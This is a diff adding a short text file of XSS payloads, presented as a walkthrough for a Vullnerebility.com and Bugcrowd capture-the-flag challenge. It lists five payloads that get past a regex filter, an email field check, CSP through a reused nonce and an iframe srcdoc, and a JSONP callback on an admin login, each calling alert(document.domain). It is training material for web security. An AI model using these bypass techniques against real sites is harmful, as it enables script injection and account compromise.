@@ -1,0 +1,39 @@
+
+
+
+
+
+
+	
+			 ////		Vullnerebility.com & Bugcrowd XSS CTF Walkthrough	/////
+	
+
+			////			youtube.com/OAcyberSecurityLabs			\\\\
+
+
+							PAYLOADS
+
+
+
+					1) Logout Vulnerability: javascript%3A%2F%2F%250dalert%2528document.domain%2529 //bypass Regex
+
+
+					2) New Password: "<img/src/onerror=alert(document.domain)>"@gmail.com // bypass PHP Code "
+
+						
+					3) Profile CSP Bypass: "><iframe srcdoc='<script nonce="EDNnf03nceIOfn39fn3e9h3sdfa">alert(document.domain);</script>'></iframe>
+	
+							(We used an iframe tag to bypass CSP)
+
+	
+
+					4) Admin Login XSS: "><script/src="/api/view?callback={onerror=alert}throw document.domain/;/"></script>
+
+
+					5) Github Bypass: <title><script nonce="EDNnf03nceIOfn39fn3e9h3sdfa">alert(document.domain);</script></title>
+			
+
+							THX FOR WATCHING..:)
+
+
+
